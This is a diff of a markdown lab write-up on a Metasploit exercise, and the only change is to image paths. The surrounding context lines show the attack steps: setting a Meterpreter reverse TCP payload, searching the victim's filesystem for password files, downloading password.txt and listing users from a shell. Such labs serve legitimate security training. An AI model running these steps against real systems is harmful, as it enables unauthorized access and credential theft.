@@ -44,7 +44,7 @@ The goal of this activity was to practice using Metasploit modules and payloads.
 
          - `set payload windows/meterpreter/reverse_tcp`
 
-        ![Find 3](Images/FIND_3.png)
+        ![Find 3](../../Images/FIND_3.png)
 
       - View the payload's options:
 
@@ -58,13 +58,13 @@ The goal of this activity was to practice using Metasploit modules and payloads.
 
          -  `set LPORT 4444`
 
-          ![Find 4](Images/FIND_4.png)
+          ![Find 4](../../Images/FIND_4.png)
 
       - Verify the option settings took effect:
 
          - `show options`
 
-         ![Find 5](Images/FIND_5.png)
+         ![Find 5](../../Images/FIND_5.png)
 
 
 5. Run the exploit:
@@ -83,7 +83,7 @@ The goal of this activity was to practice using Metasploit modules and payloads.
 
       - `search -h`
 
-      ![Find 6](Images/FIND_6.png)
+      ![Find 6](../../Images/FIND_6.png)
 
 
 7. Let's begin the hunt:
@@ -92,7 +92,7 @@ The goal of this activity was to practice using Metasploit modules and payloads.
 
       -  `search -f *.jpg`
 
-       ![Find 7](Images/FIND_7.png)
+       ![Find 7](../../Images/FIND_7.png)
    - Search the remote filesystem for a file called `password`:
 
       - `search -f password*`
@@ -101,7 +101,7 @@ The goal of this activity was to practice using Metasploit modules and payloads.
      
       - `download 'C:\Users\IEuser\Documents\password.txt'`
 
-       ![Find 8](Images/FIND_8.png)
+       ![Find 8](../../Images/FIND_8.png)
 
 ### Bonus
 
@@ -125,7 +125,7 @@ Try to complete the following tasks:
 
     - `net users`
 
-     ![Shell](Images/SHELL.png)
+     ![Shell](../../Images/SHELL.png)
 
 ____
 
